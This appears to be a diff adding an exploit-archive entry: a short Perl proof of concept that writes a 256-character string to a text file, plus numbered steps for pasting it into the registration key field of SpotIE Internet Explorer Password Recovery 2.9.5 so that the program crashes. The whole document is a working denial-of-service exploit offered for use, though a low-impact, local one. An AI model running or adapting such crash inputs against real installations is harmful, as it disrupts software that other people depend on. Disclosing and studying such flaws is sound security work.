@@ -1,0 +1,27 @@
+# Exploit Title: SpotIE Internet Explorer Password Recovery 2.9.5 - 'Key' Denial of Service (DoS)
+# Exploit Author: Emilio Revelo
+# Date: 2019-09-20
+# Software Link : http://www.nsauditor.com/downloads/spotie_setup.exe
+# Tested on: Windows 10 Pro x64 es
+
+# Steps to produce the DoS: 
+
+# 1.- Run perl script : perl SpotIE.pl
+# 2.- Open SpotIE.txt and copy the content to clipboard
+# 3.- Open SpotIE Internet Explorer Password Recovery
+# 4.- Navigate to Register -> Enter the registration name and key below...
+# 5.- Paste ClipBoard on "Key:"
+# 7.- OK
+# 8.- Crashed!!
+
+#!/usr/local/bin/perl
+
+use strict;
+use warnings;
+
+my $filename = 'SpotIE.txt';
+open(my $fh, '>', $filename) or die "Could not open file '$filename' $!";
+print $fh "E"x256;
+close $fh;
+print "Done!\n";
+print "File: SpotIE.txt\n"
